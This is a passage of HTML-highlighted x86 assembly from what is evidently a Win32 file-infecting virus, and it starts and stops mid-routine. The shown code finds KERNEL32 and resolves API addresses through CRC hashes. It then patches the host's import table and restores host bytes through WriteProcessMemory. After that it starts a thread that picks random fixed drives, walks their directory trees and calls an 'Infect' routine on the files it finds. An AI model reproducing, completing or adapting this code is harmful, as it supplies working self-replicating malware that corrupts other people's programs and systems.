        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">03ch</span><span class="sc4">]</span><span class="sc0"> 
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 

        </span><span class="sc6">jg</span><span class="sc0"> </span><span class="sc6">Loop</span><span class="sc0">                                </span><span class="sc1">;this test avoid page fault</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc3">"EP"</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc6">Loop</span><span class="sc0"> 

</span><span class="sc1">;***** End of search kernel routine</span><span class="sc0">

</span><span class="sc1">;***** Search apis addresses needed </span><span class="sc0">
</span><span class="sc1">;      In : edx=IMAGE BASE of KERNEL32</span><span class="sc0">
</span><span class="sc1">;***** Out: Searched Apis addresses are put in a Table of Dword</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;eax=RVA of PE-header</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">;eax=Address of PE-header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;eax=RVA of EXPORT DIRECTORY section</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">;eax=Address of EXPORT DIRECTORY section</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;esi=RVA of the table containing pointers</span><span class="sc0">
  

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">;esi=Address of this table,</span><span class="sc0">
                               </span><span class="sc1">;a pointer to the name of the first </span><span class="sc0">
                               </span><span class="sc1">;exported function</span><span class="sc0">

        
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                            </span><span class="sc1">;ebx holds Api index</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ApiNb</span><span class="sc0">                          </span><span class="sc1">;number of Apis remaining</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> 
          
 </span><span class="sc5">MainLoop</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc1">;***** Crc computing of the current Api name</span><span class="sc0">
</span><span class="sc1">;      In : esi: RVA of name</span><span class="sc0">
</span><span class="sc1">;***** Out: Crc variable  contains the Crc of current name string</span><span class="sc0">
        
 </span><span class="sc5">ComputeCrc</span><span class="sc4">:</span><span class="sc0">
       
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

 </span><span class="sc5">Again</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">Lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">SeeU</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Again</span><span class="sc0"> 

 </span><span class="sc5">SeeU</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Crc</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc1">;***** End of crc computing routine</span><span class="sc0">

</span><span class="sc1">;***** Test Crc</span><span class="sc0">
</span><span class="sc1">;      In : Esi: Current Api name address</span><span class="sc0">
</span><span class="sc1">;      Out: Esi= following name</span><span class="sc0">
</span><span class="sc1">;***** Ecx= Api (pointer) index in the "table of names" </span><span class="sc0">

 </span><span class="sc5">TestCrc</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Crc</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ApiNb</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">ApiList</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasd</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">MainLoop</span><span class="sc0">

        </span><span class="sc5">Found</span><span class="sc4">:</span><span class="sc0">
     
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc4">-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ApiList</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;Api position</span><span class="sc0">
                                                      </span><span class="sc1">;in our table</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0"> 
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">  
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0"> 
        </span><span class="sc6">Loop</span><span class="sc0"> </span><span class="sc5">MainLoop</span><span class="sc0">
         
</span><span class="sc1">;***** End of crc test routine</span><span class="sc0">

</span><span class="sc1">;***** End of Apis searching routine</span><span class="sc0">

</span><span class="sc1">;We need to patch the import table of host.</span><span class="sc0">
</span><span class="sc1">;But first we need to compute the address of the Api we have replaced</span><span class="sc0">
</span><span class="sc1">;by GlobalAlloc</span><span class="sc0">

</span><span class="sc1">;[Compute address of hacked api]:</span><span class="sc0">

 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">ApiHack</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_GetProcAddress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ApiOriginalAdd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_GetCurrentProcessId</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;[Restore host first executable bytes]:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_OpenProcess</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">  
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">LoaderLength</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SaveHost</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">
</span><span class="sc5">PushPatch</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">401000h</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_WriteProcessMemory</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;[Restore host hacked api]:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ApiOriginalAdd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">
</span><span class="sc5">HackAdd</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">Dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_WriteProcessMemory</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc1">;[Create_Thread]:</span><span class="sc0">

 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">ThreadID</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">_Thread</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CreateThread</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc1">;[Return to host]:</span><span class="sc0">

  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">                                       </span><span class="sc1">;push OldEip</span><span class="sc0">
  </span><span class="sc5">OldEip</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">401002h</span><span class="sc0">         
  </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">_Thread</span><span class="sc4">:</span><span class="sc0">

 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DeltaOff</span><span class="sc0">
 </span><span class="sc5">DeltaOff</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DeltaOff</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">Miliseconds</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_Sleep</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;[Save current directory]:</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DirExe</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">Dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_GetCurrentDirectoryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;***** Main routine (directory-tree search algorithm)</span><span class="sc0">
 
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Counter</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc5">HowMany</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Depth</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Key</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
 
 </span><span class="sc5">SearchDisk</span><span class="sc4">:</span><span class="sc0">

 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;32-bits number random generator</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">A</span><span class="sc0">
 </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">C</span><span class="sc0">
 </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">B</span><span class="sc0">
 </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Key</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
 
 </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000011b</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">  </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DiskName</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DiskName</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_GetDriveTypeA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">SearchDisk</span><span class="sc0">

         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c7h</span><span class="sc4">,</span><span class="sc2">85h</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileName</span><span class="sc0">
         </span><span class="sc5">DiskName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C"</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc13">":\",0 
</span><span class="sc0">
 </span><span class="sc5">Find0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Depth</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FileName</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;******  InfectCurrentDir</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">FileAttributes</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">        
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">FindMatch</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_FindFirstFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">FindF</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Infect</span><span class="sc0">           
 
 </span><span class="sc5">Next</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_FindNextFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">FindF</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Infect</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Next</span><span class="sc0">

</span><span class="sc1">;***** End of infect current dir routine</span><span class="sc0">

</span><span class="sc1">;[Findfirst dir]:</span><span class="sc0">

 </span><span class="sc5">FindF</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">FileAttributes</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">FindMatch2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0"> 
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_FindFirstFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Updir0</span><span class="sc0">

 </span><span class="sc5">Find</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileAttributes</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">FindN</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileName</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc3">"."</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Find0</span><span class="sc0">
        
</span><span class="sc1">;[FindNext dir routine]:</span><span class="sc0">

 </span><span class="sc5">FindN</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">FileAttributes</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
